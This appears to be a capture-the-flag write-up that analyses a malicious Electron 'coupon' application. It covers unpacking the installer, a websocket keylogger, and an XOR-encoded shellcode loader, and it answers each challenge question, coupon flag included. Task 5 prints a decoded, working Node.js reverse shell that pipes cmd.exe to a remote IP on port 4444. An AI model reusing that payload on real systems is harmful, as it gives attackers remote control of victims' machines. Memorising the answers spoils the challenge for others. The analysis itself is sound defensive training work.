Task 1 - What is the process name of malicious NodeJS application?
Coupon.exe
```
In pestudio or die we can see it's a nullsoft (sort of archive)
Extract Electron-coupon.exe
In the result folder go in $PLUGINDIR and then extract the app-64.7z to get the real malware which is Coupon.exe
```

Task 2 - Which option has the attacker enabled in the script to run the malicious Node.js application?
nodeIntegration
```
C:\Users\techie\Desktop\Electron-Coupon\$PLUGINSDIR\resources>npx @electron/asar extract app.asar .
In index.js
```

Task 3 - What protocol and port number is the attacker using to transmit the victim's keystrokes?
websocket, 44500
```
In the public folder obtained by extracting the asar we have a keylogger.js
```

Task 4 - What XOR key is the attacker using to decode the encoded shellcode?
ec1ee034ec1ee034
```
In the extraResources folder we have a js with a base64 decoded and then xored
The XOR key is recovered from the web
Time to use the pcap
Filter on dest port 80, can look for python user-agent
```

Task 5 - What is the IP address, port number and process name encoded in the attacker payload ?
15.206.13.31, 4444, cmd.exe
```
Put the b64string variable value in cyberchef
Add recipe from base64 and XOR with the key found and obtain:
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("cmd.exe", []);
    var client = new net.Socket();
    client.connect(4444, "15.206.13.31", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

Task 6 - What are the two commands the attacker executed after gaining the reverse shell?
whoami, ipconfig
```
PCAP filter port 4444, follow tcp stream
```

Task 7 - Which Node.js module and its associated function is the attacker using to execute the shellcode within V8 Virtual Machine contexts?
vm, runInNewContext
```
In the preload.js file, this is running the code:
	var code = outBuf.toString()
	var script = new vm.Script(code);
	var context = vm.createContext({ require: require });

	script.runInNewContext(context);
```

Task 8 - Decompile the bytecode file included in the package and identify the Win32 API used to execute the shellcode.
CreateThread
```
Supposed to use view8 but don't work cause version not supported...
```

Task 9 - Submit the fake discount coupon that the attacker intended to present to the victim.
COUPON1337
```
In the same result as before, I was unable to decode the shellcode
```